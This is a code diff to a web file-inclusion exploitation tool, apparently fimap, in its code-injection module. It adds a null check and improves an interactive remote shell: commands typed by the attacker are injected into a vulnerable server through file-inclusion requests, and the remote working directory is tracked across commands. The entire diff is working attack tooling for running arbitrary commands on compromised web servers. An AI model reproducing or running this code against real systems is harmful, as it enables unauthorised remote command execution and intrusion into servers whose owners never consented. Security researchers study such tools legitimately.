@@ -107,7 +107,7 @@ class codeinjector(baseClass):
                 elif (mode.find("R") != -1):
                     code = self.executeRFI(url, appendix, testload)
 
-                if code.find(settings["shell_test"][1]) != -1:
+                if code != None and code.find(settings["shell_test"][1]) != -1:
                     sys_inject_works = True
                     working_shell = item
                     self._log("Execution thru '%s' works!"%(name), self.globSet.LOG_INFO)
@@ -121,12 +121,21 @@ class codeinjector(baseClass):
                 if (type(attack) == str):
                     if (attack == "fimap_shell"):
                         cmd = ""
+                        pwd_cmd = payload.replace("__PAYLOAD__", "pwd")
+                        curdir = self.__doHaxRequest(url, mode, pwd_cmd, appendix).strip()
                         print shell_banner
-                        while cmd != "q" and cmd != "quit":
-                            cmd = raw_input("fimap_shell$> ")
+
+                        while 1==1:
+                            cmd = raw_input("fimap_shell:%s$> " %curdir)
+                            if cmd == "q" or cmd == "quit": break
+                            
                             if (cmd.strip() != ""):
-                                userload = payload.replace("__PAYLOAD__", cmd)
+                                userload = payload.replace("__PAYLOAD__", "cd '%s'; %s"%(curdir, cmd))
                                 code = self.__doHaxRequest(url, mode, userload, appendix)
+                                if (cmd.startswith("cd ")):
+                                    cmd = "cd '%s'; %s; pwd"%(curdir, cmd)
+                                    cmd = payload.replace("__PAYLOAD__", cmd)
+                                    curdir = self.__doHaxRequest(url, mode, cmd , appendix).strip()
                                 print code.strip()
                         print "See ya dude!"
                         sys.exit(0)
